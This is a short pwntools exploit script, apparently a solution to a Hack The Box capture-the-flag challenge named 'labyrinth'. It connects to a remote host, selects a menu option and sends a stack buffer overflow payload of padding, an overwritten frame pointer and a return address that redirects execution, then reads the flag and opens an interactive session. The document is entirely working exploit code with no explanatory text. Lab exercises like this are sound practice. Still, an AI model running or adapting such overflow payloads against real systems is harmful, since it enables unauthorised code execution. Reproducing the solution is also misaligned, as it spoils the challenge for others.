from pwn import *

context.log_level = 'DEBUG'

# p = process('./labyrinth')
p = remote('165.232.100.46', '31999')
pause()

payload = b'\0' * 48 + p64(0x404030) + p64(0x004012b0)
p.sendlineafter(b'>> ', b'69')
p.sendlineafter(b'>> ', payload)

p.recvuntil(b'HTB')
print(p.recvline())

p.interactive()